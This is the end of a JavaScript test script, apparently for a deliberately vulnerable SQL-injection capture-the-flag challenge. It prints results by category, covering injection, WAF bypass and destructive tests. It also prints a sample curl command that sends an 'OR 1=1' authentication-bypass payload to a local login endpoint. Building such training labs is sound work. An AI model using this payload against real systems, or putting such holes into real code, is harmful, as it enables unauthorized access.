    console.log('='.repeat(70));

    Object.keys(categories).forEach(category => {
        const cat = categories[category];
        const percentage = cat.total > 0 ? Math.round((cat.passed / cat.total) * 100) : 0;
        console.log(`${category}: ${cat.passed}/${cat.total} passed (${percentage}%)`);
    });

    console.log('');
    console.log(`Overall Results: ${passedTests}/${totalTests} passed (${Math.round((passedTests / totalTests) * 100)}%)`);
    console.log('');

    if (passedTests === totalTests) {
        console.log('🎉 ALL TESTS PASSED! The SQL injection vulnerability is working correctly.');
        console.log('🛡️  Security measures are preventing malicious attacks as expected.');
        console.log('✅ CTF Challenge is ready for deployment!');
    } else {
        console.log('⚠️  Some tests failed. Please check the implementation.');

        // Provide specific guidance based on failures
        if (categories['SQL Injection'].passed < categories['SQL Injection'].total) {
            console.log('💡 Basic SQL Injection tests failed - check vulnerable endpoint implementation');
        }
        if (categories['Advanced Injection'].passed < categories['Advanced Injection'].total) {
            console.log('💡 Advanced injection tests failed - check query parsing and response logic');
        }
        if (categories['Destructive Tests'].passed < categories['Destructive Tests'].total) {
            console.log('⚠️  Destructive tests failed - this indicates potential security issues');
        }
    }

    console.log('');
    console.log('🔧 Quick Commands:');
    console.log('  - Restart: ./restart.sh');
    console.log('  - Manual test: curl -X POST http://localhost:3000/login -H "Content-Type: application/json" -d \'{\'"username": "admin\\\' OR \\\'1\\\'=\\\'1\\\' --", "password": "anything"\'}\' -v');
    console.log('  - Stop server: docker-compose down');
    console.log('');
    console.log('📚 Test Categories Explained:');
    console.log('  - Basic Tests: Normal authentication and error cases');
    console.log('  - SQL Injection: Various SQL injection techniques that should succeed');
    console.log('  - Advanced Injection: Complex injection scenarios and WAF bypass techniques');
    console.log('  - Destructive Tests: Database modification attempts (should succeed but not damage)');
    console.log('  - Edge Cases: Boundary conditions, Unicode, and special character handling');
}

// Run the tests
runTests().catch(console.error);